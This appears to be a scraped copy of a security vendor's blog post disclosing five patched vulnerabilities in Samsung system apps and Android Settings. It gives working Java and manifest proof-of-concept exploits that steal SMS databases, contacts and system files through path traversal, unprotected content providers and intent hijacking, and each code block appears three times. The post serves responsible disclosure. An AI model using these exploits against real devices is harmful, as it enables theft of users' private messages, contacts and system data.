---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-08-16_two-weeks-of-securing-samsung-devices-part-2.md
original_filename: 2021-08-16_two-weeks-of-securing-samsung-devices-part-2.md
title: 'Two weeks of securing Samsung devices: Part 2'
category: documents
detected_topics:
- mobile-security
- path-traversal
- supply-chain
- xss
- command-injection
- graphql
tags:
- imported
- documents
- mobile-security
- path-traversal
- supply-chain
- xss
- command-injection
- graphql
language: en
raw_sha256: 7c0656a89c87ac8d230ec1075fe00abf81a322c9641928a8e0944a850fb3ba66
text_sha256: 67163b99e91e7b8b05d501c3bcd5e7ad658e29f966ee95ed0b86c5833b968449
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Two weeks of securing Samsung devices: Part 2

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-08-16_two-weeks-of-securing-samsung-devices-part-2.md
- Source Type: markdown
- Detected Topics: mobile-security, path-traversal, supply-chain, xss, command-injection, graphql
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `7c0656a89c87ac8d230ec1075fe00abf81a322c9641928a8e0944a850fb3ba66`
- Text SHA256: `67163b99e91e7b8b05d501c3bcd5e7ad658e29f966ee95ed0b86c5833b968449`


## Content

---
title: "Two weeks of securing Samsung devices: Part 2"
page_title: "Two weeks of securing Samsung devices: Part 2 | Oversecured Blog"
url: "https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/"
final_url: "https://oversecured.com/blog/two-weeks-of-securing-samsung-devices-part-2"
authors: ["Oversecured (@OversecuredInc)"]
programs: ["Samsung"]
bugs: ["Arbitrary file write", "Arbitrary file read", "Vulnerable Android content provider", "Android"]
bounty: "18,040"
publication_date: "2021-08-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3413
---

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

Dast is live! 

[Learn more →](../dast)

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

[](../)

[BLOG](../blog)

[Case studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

solutions

[Sign in](https://app.oversecured.com/sign-in)

Contact us

[](../)

[](../)

No headings found on page

Aug 16, 2021

Case Study

###### Two weeks of securing Samsung devices: Part 2

###### Two weeks of securing Samsung devices: Part 2

![](https://framerusercontent.com/images/F37McPky2PagSq8LI3ZvTAgMRuU.png?width=2046&height=1194)

As mentioned in the [first part](https://ovsc.framer.website/blog/two-weeks-of-securing-samsung-devices-part-1) of this series, Oversecured spent two weeks finding security bugs in Samsung’s built-in apps. In this part, we will go over bugs that could have allowed an attacker to:

  * read & write arbitrary files in the name of the system

  * read arbitrary telephone-related files from the Android user’s phone, such as their call history and SMS/MMS

  * read & modify the user’s contact data

  * steal the user’s messages from the Samsung Messages app

Vulnerability table:

CVE| SVE| AFFECTED APP| DESCRIPTION| REWARD AMOUNT  
---|---|---|---|---  
CVE-2021-25426| SVE-2021-20903| Samsung Messages (com.samsung.android.messaging)| Theft of arbitrary files| $1050  
CVE-2021-25410| SVE-2021-20702| CallBGProvider (com.samsung.android.callbgprovider)| Read arbitrary files as system (UID 1001) user| $2180  
CVE-2021-25413| SVE-2021-20877| Samsung Contacts (com.samsung.android.app.contacts)| Gaining access to arbitrary* content providers| $2250  
CVE-2021-25414| SVE-2021-20879| Samsung Contacts (com.samsung.android.app.contacts)| Theft/overwrite of arbitrary files| $2250  
CVE-2021-25440| SVE-2021-20722| FactoryCameraFB (com.sec.factory.camera)| Read/write arbitrary files as system (UID 1000) user| $10310  
  
Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2-week trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## File theft in Samsung Messages

After scanning the Samsung Messages app, we received an alert about the possibility for theft of arbitrary files:

![](https://framerusercontent.com/images/8YjGI7Fa0hiOf0HvWgqOyDypjo.png?width=2258&height=15472)

We could pass an attacker-controlled URI through the `SmsViewerData.f25878w` field and the app would then save it to the `/sdcard/Android/data/com.samsung.android.messaging/cache/` folder when the user pressed the Share message button.

To access arbitrary files, we used an unsafe content provider:

![](https://framerusercontent.com/images/lII3YZZ9L6wUHX2phIE9vYSRDcY.png?width=2252&height=704)

### Proof of Concept:
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  String fileName = "evil.mp4";
  
  SmsViewerData data = new SmsViewerData();
  data.f25878w = Uri.parse("content://com.samsung.android.messaging.ui.file/root-path/data/data/com.samsung.android.messaging/databases/message_content.db");
  data.f25879x = fileName;
  data.f25871p = 1;
  data.f25864i = 12;
  data.f25877v = "video/mp4";
  
  Intent i = new Intent();
  i.setClassName("com.samsung.android.messaging", "com.samsung.android.messaging.ui.view.viewer.SmsViewerActivity");
  i.putExtra("xms_viewer_data", data);
  startActivity(i);
  
  new Handler().postDelayed(() -> {
  String path = getExternalCacheDir().getAbsolutePath().replace(getPackageName(), "com.samsung.android.messaging");
  dumpFile(new File(path, fileName).getAbsolutePath());
  }, 15000);
  }
  
  private void dumpFile(String path) {
  ContentValues values = new ContentValues();
  values.put("_data", path);
  Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri("external"), values);
  
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  Log.d("evil", "Error", th);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  String fileName = "evil.mp4";
  
  SmsViewerData data = new SmsViewerData();
  data.f25878w = Uri.parse("content://com.samsung.android.messaging.ui.file/root-path/data/data/com.samsung.android.messaging/databases/message_content.db");
  data.f25879x = fileName;
  data.f25871p = 1;
  data.f25864i = 12;
  data.f25877v = "video/mp4";
  
  Intent i = new Intent();
  i.setClassName("com.samsung.android.messaging", "com.samsung.android.messaging.ui.view.viewer.SmsViewerActivity");
  i.putExtra("xms_viewer_data", data);
  startActivity(i);
  
  new Handler().postDelayed(() -> {
  String path = getExternalCacheDir().getAbsolutePath().replace(getPackageName(), "com.samsung.android.messaging");
  dumpFile(new File(path, fileName).getAbsolutePath());
  }, 15000);
  }
  
  private void dumpFile(String path) {
  ContentValues values = new ContentValues();
  values.put("_data", path);
  Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri("external"), values);
  
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  Log.d("evil", "Error", th);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  String fileName = "evil.mp4";
  
  SmsViewerData data = new SmsViewerData();
  data.f25878w = Uri.parse("content://com.samsung.android.messaging.ui.file/root-path/data/data/com.samsung.android.messaging/databases/message_content.db");
  data.f25879x = fileName;
  data.f25871p = 1;
  data.f25864i = 12;
  data.f25877v = "video/mp4";
  
  Intent i = new Intent();
  i.setClassName("com.samsung.android.messaging", "com.samsung.android.messaging.ui.view.viewer.SmsViewerActivity");
  i.putExtra("xms_viewer_data", data);
  startActivity(i);
  
  new Handler().postDelayed(() -> {
  String path = getExternalCacheDir().getAbsolutePath().replace(getPackageName(), "com.samsung.android.messaging");
  dumpFile(new File(path, fileName).getAbsolutePath());
  }, 15000);
  }
  
  private void dumpFile(String path) {
  ContentValues values = new ContentValues();
  values.put("_data", path);
  Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri("external"), values);
  
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  Log.d("evil", "Error", th);
  }
  }

Since the latest Android versions do not allow accessing external cache files, we made use of the `dumpFile` method to bypass this protection in our PoC.

## File theft from UID 1001 in CallBGProvider

The `CallBGProvider` provider is declared with the permission `com.samsung.android.callbgprovider.PERMISSION`, which is not properly protected:
  
  
  <permission android:name="com.samsung.android.callbgprovider.PERMISSION" />
  
  
  <permission android:name="com.samsung.android.callbgprovider.PERMISSION" />
  
  
  <permission android:name="com.samsung.android.callbgprovider.PERMISSION" />

If `android:protectionLevel` is not specifically set by the developer, it gets defined as `normal` by default – which would allow any third-party apps to access the resource.

![](https://framerusercontent.com/images/uzi0HFs8zUpteQPI79JrfkP3cFE.png?width=2262&height=1764)

The above provider is also vulnerable to path traversal due to the use of `Uri.getLastPathSegment()`, which automatically decodes the value.

### Proof of Concept

For reading the database containing SMS/MMS messages.

File `AndroidManifest.xml`:
  
  
  <uses-permission android:name="com.samsung.android.callbgprovider.PERMISSION" />
  
  
  <uses-permission android:name="com.samsung.android.callbgprovider.PERMISSION" />
  
  
  <uses-permission android:name="com.samsung.android.callbgprovider.PERMISSION" />

File `MainActivity.java`:
  
  
  try {
  getContentResolver().call(Uri.parse("content://com.samsung.android.callbgprovider.media"), "get_gradation_contents", "", new Bundle());
  
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  Uri uri = Uri.parse("content://com.samsung.android.callbgprovider.media/videos/..%2F..%2F..%2F..%2F..%2F.." + Uri.encode(dbPath.getAbsolutePath()));
  
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  Log.d("evil", IOUtils.toString(inputStream));
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  
  
  try {
  getContentResolver().call(Uri.parse("content://com.samsung.android.callbgprovider.media"), "get_gradation_contents", "", new Bundle());
  
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  Uri uri = Uri.parse("content://com.samsung.android.callbgprovider.media/videos/..%2F..%2F..%2F..%2F..%2F.." + Uri.encode(dbPath.getAbsolutePath()));
  
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  Log.d("evil", IOUtils.toString(inputStream));
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  
  
  try {
  getContentResolver().call(Uri.parse("content://com.samsung.android.callbgprovider.media"), "get_gradation_contents", "", new Bundle());
  
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  Uri uri = Uri.parse("content://com.samsung.android.callbgprovider.media/videos/..%2F..%2F..%2F..%2F..%2F.." + Uri.encode(dbPath.getAbsolutePath()));
  
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  Log.d("evil", IOUtils.toString(inputStream));
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }

The code in `CallBGProvider.call()` helps create directories like `videos`, `images`, etc., which don’t exist by default. Therefore, if `getContentResolver().call()` wasn’t present in our PoC, then calling `ParcelFileDescriptor.open()` would have thrown a `FileNotFoundException` error.

## File theft and writing to Samsung Contacts

The activity `com.samsung.android.contacts.editor.SetProfilePhotoActivity` in the Samsung Contacts app is exported. Moreover, it also accepts two attacker-controlled URIs:

  1. `shared_photo_uri` for getting content

  2. `temp_photo_uri` for saving content

![](https://framerusercontent.com/images/fdqDdUjBcRJvEsb13gkZpTxAWiA.png?width=2244&height=10432)

To access arbitrary files, we used the content provider `com.samsung.android.scloud.oem.lib.ClientProvider` with the authority `com.samsung.contacts.backup`. This, in turn, provided us with read/write access to arbitrary files specified in the path section of the URI.

### Proof of Concept

File `AndroidManifest.xml`:
  
  
  <provider android:name=".MyContentProvider" android:authorities="oversecured.evil" android:exported="true" />
  
  
  <provider android:name=".MyContentProvider" android:authorities="oversecured.evil" android:exported="true" />
  
  
  <provider android:name=".MyContentProvider" android:authorities="oversecured.evil" android:exported="true" />

File `MainActivity.java`:
  
  
  String path = new File(getApplicationInfo().dataDir, "dump").getAbsolutePath();
  String theft = "/data/data/com.samsung.android.app.contacts/shared_prefs/SamsungAnalyticsPrefs.xml";
  
  Intent i = new Intent(Intent.ACTION_SEND);
  i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
  i.putExtra("shared_photo_uri", "content://com.samsung.contacts.backup" + theft); // input
  i.putExtra("temp_photo_uri", "content://oversecured.evil/?path=" + path); // output
  i.putExtra("cropped_photo_uri", "");
  i.putExtra("mimeType", "x");
  startActivity(i);
  
  new Handler().postDelayed(() -> {
  try (InputStream inputStream = new FileInputStream(path)) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }, 1000);
  
  
  String path = new File(getApplicationInfo().dataDir, "dump").getAbsolutePath();
  String theft = "/data/data/com.samsung.android.app.contacts/shared_prefs/SamsungAnalyticsPrefs.xml";
  
  Intent i = new Intent(Intent.ACTION_SEND);
  i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
  i.putExtra("shared_photo_uri", "content://com.samsung.contacts.backup" + theft); // input
  i.putExtra("temp_photo_uri", "content://oversecured.evil/?path=" + path); // output
  i.putExtra("cropped_photo_uri", "");
  i.putExtra("mimeType", "x");
  startActivity(i);
  
  new Handler().postDelayed(() -> {
  try (InputStream inputStream = new FileInputStream(path)) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }, 1000);
  
  
  String path = new File(getApplicationInfo().dataDir, "dump").getAbsolutePath();
  String theft = "/data/data/com.samsung.android.app.contacts/shared_prefs/SamsungAnalyticsPrefs.xml";
  
  Intent i = new Intent(Intent.ACTION_SEND);
  i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
  i.putExtra("shared_photo_uri", "content://com.samsung.contacts.backup" + theft); // input
  i.putExtra("temp_photo_uri", "content://oversecured.evil/?path=" + path); // output
  i.putExtra("cropped_photo_uri", "");
  i.putExtra("mimeType", "x");
  startActivity(i);
  
  new Handler().postDelayed(() -> {
  try (InputStream inputStream = new FileInputStream(path)) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }, 1000);

File `MyContentProvider.java`:
  
  
  public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
  try {
  return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_WRITE_ONLY | ParcelFileDescriptor.MODE_CREATE);
  } catch (Throwable th) {
  return null;
  }
  }
  
  
  public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
  try {
  return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_WRITE_ONLY | ParcelFileDescriptor.MODE_CREATE);
  } catch (Throwable th) {
  return null;
  }
  }
  
  
  public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
  try {
  return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_WRITE_ONLY | ParcelFileDescriptor.MODE_CREATE);
  } catch (Throwable th) {
  return null;
  }
  }

## Accessing arbitrary Content Providers in Samsung Contacts

This attack uses the same activity (`com.samsung.android.contacts.editor.SetProfilePhotoActivity`) as the previous vulnerability.

The flow of this attack looks like this:

  1. An invalid URI is specified by an attacker in `temp_photo_uri`

  2. The app automatically launches an implicit intent with the `Intent.FLAG_GRANT_READ_URI_PERMISSION` & `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` flags

  3. The attacker-controlled value in `cropped_photo_uri` is passed to the Intent’s ClipData.

![](https://framerusercontent.com/images/o1jGnE3j4MtHjnHWaXfJCLZJzOs.png?width=2252&height=13766)

When an attacker intercepts the implicit intent, they will automatically have read/write access to the URI.

### Proof of Concept

For reading a complete contact list.

File `AndroidManifest.xml`
  
  
  <activity android:name=".PickerActivity">
  <intent-filter android:priority="999">
  <action android:name="com.android.camera.action.CROP" />
  <category android:name="android.intent.category.DEFAULT" />
  <data android:mimeType="*/*" />
  <data android:mimeType="image/*" />
  <data android:mimeType="test/1337" />
  </intent-filter>
  </activity>
  
  
  <activity android:name=".PickerActivity">
  <intent-filter android:priority="999">
  <action android:name="com.android.camera.action.CROP" />
  <category android:name="android.intent.category.DEFAULT" />
  <data android:mimeType="*/*" />
  <data android:mimeType="image/*" />
  <data android:mimeType="test/1337" />
  </intent-filter>
  </activity>
  
  
  <activity android:name=".PickerActivity">
  <intent-filter android:priority="999">
  <action android:name="com.android.camera.action.CROP" />
  <category android:name="android.intent.category.DEFAULT" />
  <data android:mimeType="*/*" />
  <data android:mimeType="image/*" />
  <data android:mimeType="test/1337" />
  </intent-filter>
  </activity>

File `MainActivity.java`:
  
  
  Intent i = new Intent(Intent.ACTION_SEND);
  i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
  i.putExtra("temp_photo_uri", "/");
  i.putExtra("cropped_photo_uri", ContactsContract.CommonDataKinds.Phone.CONTENT_URI.toString());
  i.putExtra("mimeType", "test/1337");
  startActivity(i);
  
  
  Intent i = new Intent(Intent.ACTION_SEND);
  i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
  i.putExtra("temp_photo_uri", "/");
  i.putExtra("cropped_photo_uri", ContactsContract.CommonDataKinds.Phone.CONTENT_URI.toString());
  i.putExtra("mimeType", "test/1337");
  startActivity(i);
  
  
  Intent i = new Intent(Intent.ACTION_SEND);
  i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
  i.putExtra("temp_photo_uri", "/");
  i.putExtra("cropped_photo_uri", ContactsContract.CommonDataKinds.Phone.CONTENT_URI.toString());
  i.putExtra("mimeType", "test/1337");
  startActivity(i);

File `PickerActivity.java`:
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  if ("com.android.camera.action.CROP".equals(getIntent().getAction())) {
  dump(getIntent().getClipData().getItemAt(0).getUri());
  }
  
  finish();
  }
  
  public void dump(Uri uri) {
  Cursor cursor = getContentResolver().query(uri, null, null, null, null);
  if (cursor.moveToFirst()) {
  do {
  StringBuilder sb = new StringBuilder();
  for (int i = 0; i < cursor.getColumnCount(); i++) {
  if (sb.length() > 0) {
  sb.append(", ");
  }
  sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
  }
  Log.d("evil", sb.toString());
  } while (cursor.moveToNext());
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  if ("com.android.camera.action.CROP".equals(getIntent().getAction())) {
  dump(getIntent().getClipData().getItemAt(0).getUri());
  }
  
  finish();
  }
  
  public void dump(Uri uri) {
  Cursor cursor = getContentResolver().query(uri, null, null, null, null);
  if (cursor.moveToFirst()) {
  do {
  StringBuilder sb = new StringBuilder();
  for (int i = 0; i < cursor.getColumnCount(); i++) {
  if (sb.length() > 0) {
  sb.append(", ");
  }
  sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
  }
  Log.d("evil", sb.toString());
  } while (cursor.moveToNext());
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  if ("com.android.camera.action.CROP".equals(getIntent().getAction())) {
  dump(getIntent().getClipData().getItemAt(0).getUri());
  }
  
  finish();
  }
  
  public void dump(Uri uri) {
  Cursor cursor = getContentResolver().query(uri, null, null, null, null);
  if (cursor.moveToFirst()) {
  do {
  StringBuilder sb = new StringBuilder();
  for (int i = 0; i < cursor.getColumnCount(); i++) {
  if (sb.length() > 0) {
  sb.append(", ");
  }
  sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
  }
  Log.d("evil", sb.toString());
  } while (cursor.moveToNext());
  }
  }

## File theft and write from UID 1000 in FactoryCameraFB

The FactoryCameraFB app contained vulnerable code that allowed access to arbitrary* content providers:

![](https://framerusercontent.com/images/aHYKfGr81BADWaSwhhTlslg2kd4.png?width=2254&height=1634)

It should be noted that this app has a property called `android:sharedUserId="android.uid.system"`, which makes it a system application.

As described in the vulnerability in Android Settings, we used a content provider in the `com.sec.imsservice` app, which provided access to arbitrary files:

![](https://framerusercontent.com/images/7NtYRqMFenWIkDgaKiRsY4nhh6U.png?width=2256&height=708)

For testing, we used the file `/data/system/users/0/settings_secure.xml` (which has these permissions: `-rw ------- 1 system system`).

### Proof of Concept

As a result of which the content of the file was printed to the logs.
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setData(Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"));
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  i.setClassName("com.sec.factory.camera", "com.sec.android.app.camera.CameraTestActivity");
  i.putExtra("testtype", "NCAMTEST");
  i.putExtra("arg1", "0");
  i.putExtra("arg2", "1");
  i.putExtra("arg3", "2");
  i.putExtra("arg4", "0");
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setData(Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"));
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  i.setClassName("com.sec.factory.camera", "com.sec.android.app.camera.CameraTestActivity");
  i.putExtra("testtype", "NCAMTEST");
  i.putExtra("arg1", "0");
  i.putExtra("arg2", "1");
  i.putExtra("arg3", "2");
  i.putExtra("arg4", "0");
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setData(Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"));
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  i.setClassName("com.sec.factory.camera", "com.sec.android.app.camera.CameraTestActivity");
  i.putExtra("testtype", "NCAMTEST");
  i.putExtra("arg1", "0");
  i.putExtra("arg2", "1");
  i.putExtra("arg3", "2");
  i.putExtra("arg4", "0");
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }

## The vulnerability in Android Settings

In [the previous article](https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/#the-vulnerability-in-secsettings), we published information about a vulnerability in Android Settings for which we received a $2,000 award from Google AOSP.

The activity `com.android.settings.wifi.WifiDialogActivity` is exported (however, it requests the sender to have `android.permission.CHANGE_WIFI_STATE` permission). When a user clicks on the QR code scan icon, it launches an implicit intent and passes its activity result to its own `setResult(code, attacker_controlled_intent)`.

### Proof of Concept

To access any system files on Samsung devices.

File `AndroidManifest.xml`:
  
  
  <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
  
  
  <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
  
  
  <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
  
  
  <activity android:name=".PickerActivity">
  <intent-filter android:priority="999">
  <action android:name="android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER" />
  <category android:name="android.intent.category.DEFAULT" />
  </intent-filter>
  </activity>
  
  
  <activity android:name=".PickerActivity">
  <intent-filter android:priority="999">
  <action android:name="android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER" />
  <category android:name="android.intent.category.DEFAULT" />
  </intent-filter>
  </activity>
  
  
  <activity android:name=".PickerActivity">
  <intent-filter android:priority="999">
  <action android:name="android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER" />
  <category android:name="android.intent.category.DEFAULT" />
  </intent-filter>
  </activity>

File `MainActivity.java`:
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setClassName("com.android.settings", "com.android.settings.wifi.WifiDialogActivity");
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setClassName("com.android.settings", "com.android.settings.wifi.WifiDialogActivity");
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setClassName("com.android.settings", "com.android.settings.wifi.WifiDialogActivity");
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
  Log.d("evil", IOUtils.toString(inputStream));
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }

File `PickerActivity.java`:
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent("evil");
  i.setData(Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"));
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  setResult(-1, i);
  finish();
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent("evil");
  i.setData(Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"));
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  setResult(-1, i);
  finish();
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent("evil");
  i.setData(Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"));
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  setResult(-1, i);
  finish();
  }

##### Keep reading

[View all](../blog)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/3pdKQL7LiXMgBBDS1jzcalJrMnA.png?width=2048&height=1194)Android security checklist: theft of arbitrary filesDevelopers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. Android SecurityMay 20, 202211min readTOp article](./android-security-checklist-theft-of-arbitrary-files)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

